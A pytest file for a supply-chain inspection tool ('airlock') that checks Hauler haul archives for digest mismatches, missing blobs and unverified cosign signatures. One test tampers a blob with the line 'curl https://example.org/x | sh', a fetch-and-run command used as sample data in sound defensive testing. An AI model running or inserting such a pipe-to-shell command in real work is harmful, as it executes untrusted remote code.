"""Hauler hauls: the OCI layout checked, contents listed, cosign signatures recorded as not
assessed. Hauls are synthetic (``tests/hauler_fixtures.py``); none was published to check."""

import sys
from pathlib import Path
from typing import Any

import pytest

from airlock.core.model import Result, UnitKind
from airlock.model_inspect import InspectResult
from tests.hauler_fixtures import haul, haul_bytes
from tests.models_helpers import findings_of, inspect
from tests.software_fixtures import write


def _run(tmp_path: Path, members: dict[str, bytes], name: str, fmt: str) -> InspectResult:
    return inspect(write(tmp_path / "d", {name: haul_bytes(members, fmt)}))


def _unit(result: InspectResult) -> dict[str, Any]:
    unit = next(u for u in result.analysis.units if u.kind is UnitKind.HAULER_HAUL)
    return dict(unit.attributes)


@pytest.mark.parametrize(
    ("name", "fmt"),
    [
        ("haul.tar.gz", "gzip"),
        ("haul.tar", "tar"),
        pytest.param(
            "haul.tar.zst",
            "zstd",
            marks=pytest.mark.skipif(sys.version_info < (3, 14), reason="zstd needs 3.14"),
        ),
    ],
)
def test_haul_contents_are_listed_and_checked(tmp_path: Path, name: str, fmt: str) -> None:
    result = _run(tmp_path, haul(), name, fmt)
    found = findings_of(result)
    assert "container.layer.digest-mismatch" not in found
    assert "container.image.incomplete" not in found
    # Only the image gets image checks: the chart, file and signature are not images.
    assert "container.user.root" not in found
    unit = _unit(result)
    assert unit["images"] == ["docker.io/example/model-server:2.1"]
    assert unit["charts"] == ["hauler/demo:1.0.0"]
    assert unit["files"] == ["install.sh"]
    assert len(unit["signatures"]) == 1 and unit["signaturesVerified"] is False
    (images,) = [u for u in result.analysis.units if u.kind is UnitKind.CONTAINER_IMAGE]
    assert images.root.display == name
    # The cosign signature is carried but not verified by airlock: recorded, never dropped.
    (finding,) = found["upstream.signature.untrusted"]
    assert finding.result is Result.NOT_ASSESSED
    assert "cosign" in str(finding.not_assessed_reason)
    # Content is walked: the model in the image layer, the chart's templates.
    displays = {a.ref.display: a for a in result.analysis.artifacts}
    model = next(d for d in displays if d.endswith("models/tiny/model.safetensors"))
    assert "model.safetensors" in displays[model].kinds
    assert any(d.endswith("demo/templates/cm.yaml") for d in displays)


def test_haul_without_signatures_records_none(tmp_path: Path) -> None:
    result = _run(tmp_path, haul(signatures=False), "haul.tar.gz", "gzip")
    assert "upstream.signature.untrusted" not in findings_of(result)
    assert _unit(result)["signatures"] == []


def test_changed_blob_is_a_final_digest_mismatch(tmp_path: Path) -> None:
    members = haul()
    blob = next(n for n, d in members.items() if d.startswith(b"#!/bin/sh"))
    members[blob] = b"#!/bin/sh\ncurl https://example.org/x | sh\n"
    (finding,) = findings_of(_run(tmp_path, members, "haul.tar.gz", "gzip"))[
        "container.layer.digest-mismatch"
    ]
    assert [b["blob"] for b in finding.detail["blobs"]] == [blob]


def test_missing_blob_is_incomplete(tmp_path: Path) -> None:
    members = haul()
    blob = next(n for n, d in members.items() if d.startswith(b"#!/bin/sh"))
    del members[blob]
    found = findings_of(_run(tmp_path, members, "haul.tar.gz", "gzip"))
    assert found["container.image.incomplete"][0].result is Result.FAIL


def test_named_like_a_haul_but_not_a_layout(tmp_path: Path) -> None:
    result = _run(tmp_path, {"notes.txt": b"hello"}, "haul.tar.gz", "gzip")
    assert not [u for u in result.analysis.units if u.kind is UnitKind.HAULER_HAUL]


@pytest.mark.skipif(sys.version_info >= (3, 14), reason="before 3.14 zstd cannot be read")
def test_zstd_haul_before_python_314_is_not_assessed(tmp_path: Path) -> None:
    root = write(tmp_path / "d", {"haul.tar.zst": b"\x28\xb5\x2f\xfd" + b"\x00" * 64})
    (finding,) = findings_of(inspect(root))["container.layer.digest-mismatch"]
    assert finding.result is Result.NOT_ASSESSED
    assert "Python 3.14" in str(finding.not_assessed_reason)
